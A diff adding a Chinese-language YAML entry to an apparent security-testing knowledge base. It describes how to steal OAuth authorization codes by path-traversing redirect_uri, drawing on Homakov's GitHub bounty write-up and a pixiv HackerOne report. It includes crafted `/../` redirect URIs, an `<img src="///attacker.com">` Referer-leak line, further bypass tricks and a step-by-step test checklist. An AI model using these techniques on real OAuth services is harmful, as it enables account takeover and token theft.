@@ -1,0 +1,115 @@
+name: "OAuth redirect_uri 路径穿越绕过 + token endpoint 缺少 redirect_uri 验证——authorization code 劫持"
+id: "OAUTH_REDIRECT_URI_PATH_TRAVERSAL"
+applicable: "blackbox"
+phase: "auth"
+also_phases: ["chain"]
+tags: ["oauth", "redirect-uri", "path-traversal", "authorization-code", "token-hijack", "referer-leak"]
+source: "http://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html"
+
+# ——— L3 核心 ———
+
+observation: >
+  GitHub OAuth 文档规定 redirect_uri 的路径必须是已注册 callback URL 的子目录
+  （不能任意指定域名，但子目录是允许的）。
+  (原文: "If provided, the redirect URL's host and port must exactly match the callback URL.
+  The redirect URL's path must reference a subdirectory of the callback URL")
+  作者同时观察到 token endpoint 在接受 code 兑换 access_token 时，
+  并不严格验证提交的 redirect_uri 是否与 code 签发时的 redirect_uri 一致。
+
+hypothesis: >
+  未叙述（仅结果）。推断：若 redirect_uri 子目录限制可通过 `/../` 路径穿越绕过，
+  则可将 authorization code 重定向到攻击者控制的页面（同域下的其他 URL）；
+  结合 token endpoint 不验证 redirect_uri，可完成 code 劫持 → access_token 窃取。
+
+action_result: >
+  Bug 1（redirect_uri 路径穿越）：
+  注册 callback URL 为 https://gist.github.com/auth/github/callback
+  构造 redirect_uri：https://gist.github.com/auth/github/callback/../../../homakov/8820324
+  测试结果：GitHub 接受，302 重定向到包含 code 的 URL
+  (原文: "I then tried path traversal with /../ — it worked.")
+
+  Bug 2（token endpoint 缺少 redirect_uri 验证）：
+  OAuth2 规范要求兑换 token 时提交与授权时相同的 redirect_uri
+  GitHub 实现：无论提供什么 redirect_uri，都返回有效 access_token
+  (原文: "no matter what redirect_uri the Client sent to get a token,
+  the Provider responded with valid access_token")
+
+  两个 bug 组合 → 可将 code 重定向到攻击者可读的页面，
+  再用该 code + 任意 redirect_uri 兑换 token。
+
+  进一步串链（GitHub 特定）：
+  - Bug 3：在目标页面（Gist）注入 `<img src="///attacker.com">` 泄露 Referer 中的 code
+    （///host 在 Ruby URI 被解析为路径，但浏览器视为协议相对 URL，绕过 Camo-proxy）
+  - Bug 4：_gist_session cookie 中包含 github_token（明文 Base64 解码即可获取）
+  - Bug 5：Gist 为预批准客户端，自动批准任意 scope → 可申请 repo 等高权限
+
+  完整 5 环串链：redirect_uri 穿越 → code 泄露到攻击者 Gist → Referer 图片外泄 code
+  → 兑换 token → 解码 cookie 得 github_token → 访问私有仓库。
+
+why_here_first: >
+  未叙述（仅结果）。推断：GitHub 刚发布 Bug Bounty 程序，
+  OAuth 是高价值攻击面——redirect_uri 验证是 OAuth 实现最常见的缺陷点。
+  (原文: "Github launched a Bounty program which was a good motivator for me to play with Github OAuth.")
+
+chaining: >
+  Bug 1（路径穿越）单独危害有限——只能重定向到同域的不同路径。
+  Bug 2（token endpoint 不验证 redirect_uri）单独危害有限——必须先拿到 code。
+  两者组合：code 可重定向到攻击者控制的同域页面 → 被 Referer 或 URL 泄露 → 兑换 token。
+  核心跳跃：找到目标域内可泄露 URL 参数的页面（Referer 图片加载、Open Redirect、
+  URL fragment 处理不当）是将 Bug 1+2 变为实际利用的关键。
+
+# ——— 落地检查清单 ———
+
+approach: >
+  对 OAuth 授权流程，测试 redirect_uri 是否接受路径穿越（/../ 或 /./）绕过子目录限制；
+  同时测试 token endpoint 在兑换 code 时是否验证 redirect_uri 与授权时一致；
+  两者组合可劫持 authorization code。
+
+reasoning_chain:
+  - "问：目标 OAuth 实现是否要求 redirect_uri 必须是已注册 callback URL 的子目录（而非精确匹配）？"
+  - "黑盒测试：在 redirect_uri 中注入 /../ 路径穿越，如 https://legit.com/callback/../../../attacker-page，观察是否被 server 接受（302 重定向而非报错）。"
+  - "黑盒测试：用合法方式获取一个 authorization code，然后在兑换 token 时提交不同的 redirect_uri，观察 server 是否仍返回 access_token。"
+  - "如果两者都通过：问：目标域内是否有可泄露 URL 参数的页面？（Referer 泄露到第三方资源、URL fragment 处理不当、Open Redirect、用户可控内容页面）"
+  - "如果有泄露点：构造 redirect_uri 指向泄露页面，诱导受害者访问授权链接 → code 通过 Referer 泄露给攻击者。"
+  - "问：目标 OAuth client 是否为预批准客户端（无需用户手动授权权限）？若是，可请求高权限 scope。"
+  - "问：OAuth client 的 session cookie 是否包含 access_token？（Base64 解码 session cookie 验证）"
+  - "白盒审计：检查 token endpoint 代码，确认是否存在 redirect_uri 验证逻辑；检查 redirect_uri 正则/白名单是否可通过路径穿越或 URL 解析差异绕过。"
+  - "扩展：其他 redirect_uri 绕过手法：URL 末尾追加 @attacker.com、利用 URL 解析差异（如 ///attacker.com）、Unicode 编码等。"
+
+vuln_root: >
+  OAuth 服务端假设子目录限制（path 必须是 callback URL 的子目录）足以防止重定向到任意路径；
+  未意识到 /../ 路径穿越可逃出子目录限制，指向同域下任意路径；
+  同时 token endpoint 假设 code 只有在正确 redirect_uri 下才能被使用，
+  但未实现验证逻辑，导致任意 redirect_uri 都可兑换 token。
+
+transferable_to:
+  - "任何 OAuth 提供商（Google、Facebook、GitHub、Twitter、微信等）的 redirect_uri 验证逻辑"
+  - "自建 OAuth 服务器（如使用 OAuth2 library 但未正确配置 strict redirect_uri 验证）"
+  - "支持多 redirect_uri 前缀的 OAuth 实现（如子域通配符、路径前缀匹配）"
+  - "OIDC（OpenID Connect）的 redirect_uri 验证——同样适用路径穿越绕过"
+  - "任何使用 Referer 传递敏感参数的页面（如包含 code/token 的 URL 被 Referer 泄露）"
+
+cases:
+  - source: "http://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html"
+    author: "Egor Homakov"
+    platform: "GitHub"
+    bounty: "$4,000"
+    note: >
+      5 低危 bug 串链：redirect_uri /../ 穿越 → token endpoint 不验 redirect_uri →
+      Gist 注入 ///host 图片泄露 Referer（绕过 Camo-proxy）→
+      _gist_session cookie 含 github_token → Gist 预批准自动批准高权限 scope →
+      读取受害者私有仓库。无需 JavaScript，绕过 NoScript。
+      Bug 1：GitHub 接受 redirect_uri 中的 /../ 路径穿越（绕过子目录限制）。
+      Bug 2：token endpoint 无论提交何种 redirect_uri 都返回有效 token。
+      这两个 bug 的发现顺序是先找到路径穿越，再验证 token endpoint 是否有配套验证。
+  - url: "https://hackerone.com/reports/1861974"
+    title: "Stealing Users OAuth authorization code via redirect_uri"
+    platform: "pixiv (booth.pm)"
+    severity: "High"
+    bounty: "$2,000"
+    note: >
+      pixiv OAuth 授权端点的 redirect_uri 参数接受路径穿越（/../../../../ja/items/XXX），
+      可将用户重定向到攻击者在 booth.pm 上创建的商品页面。
+      攻击者在商品页面启用 Google Analytics，当受害者被重定向时，
+      authorization code 通过 query string 泄露到 GA 实时报告中。
+      纯结果文，无扑空/思考过程叙述。
